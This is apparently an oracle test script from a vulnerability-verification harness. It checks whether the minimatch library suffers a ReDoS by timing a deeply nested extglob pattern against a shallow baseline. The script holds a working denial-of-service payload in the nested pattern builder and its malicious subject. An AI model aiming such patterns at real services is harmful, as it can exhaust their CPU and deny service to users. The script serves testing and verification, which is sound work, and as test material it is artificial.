'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;

try {
  // Benign operation: prove the API works with a simple extglob pattern.
  const benignSubject = 'aaaaaaaaaa';
  const benignPattern = '*(a)';
  const benignResult = minimatch(benignSubject, benignPattern);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Malicious input: deeply nested extglob-group pattern known to trigger
  // catastrophic backtracking in minimatch 3.0.4's regex conversion.
  // Keep N small enough that even the vulnerable version finishes within
  // a few seconds, but large enough to cause clear exponential slowdown.
  function buildPattern(n) {
    // Nested star-groups: "*(*(*(...a...)))" style nesting forces the
    // vulnerable regex engine into exponential backtracking when matched
    // against a non-matching subject with a trailing character.
    let p = 'a';
    for (let i = 0; i < n; i++) {
      p = '*(' + p + ')';
    }
    return p;
  }

  const N = 14; // nesting depth for malicious case
  const maliciousPattern = buildPattern(N);
  const maliciousSubject = 'a'.repeat(N + 2) + 'X'; // non-matching, forces backtracking

  // Baseline: much shallower nesting, same shape, for comparison.
  const baselineN = 4;
  const baselinePattern = buildPattern(baselineN);
  const baselineSubject = 'a'.repeat(baselineN + 2) + 'X';

  const baselineStart = process.hrtime.bigint();
  let baselineThrew = false;
  try {
    minimatch(baselineSubject, baselinePattern);
  } catch (e) {
    baselineThrew = true;
  }
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  let errMsg = '';
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
    errMsg = String(e && e.message);
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  const absoluteThresholdMs = 1500; // vulnerable case should clearly exceed this
  const relativeSlowdownFactor = 100; // vulnerable call should be vastly slower than baseline
  const safeBaselineMs = Math.max(baselineMs, 0.05);

  let exploit_succeeded;
  let evidence;

  if (!threw && elapsedMs > absoluteThresholdMs && elapsedMs > safeBaselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call with nested extglob pattern (depth ' + N + ') took ' + elapsedMs.toFixed(2) + 'ms vs baseline (depth ' + baselineN + ') ' + baselineMs.toFixed(3) + 'ms (threshold ' + absoluteThresholdMs + 'ms, factor ' + relativeSlowdownFactor + 'x), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2) + ' err=' + errMsg;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed quickly (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no ReDoS observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
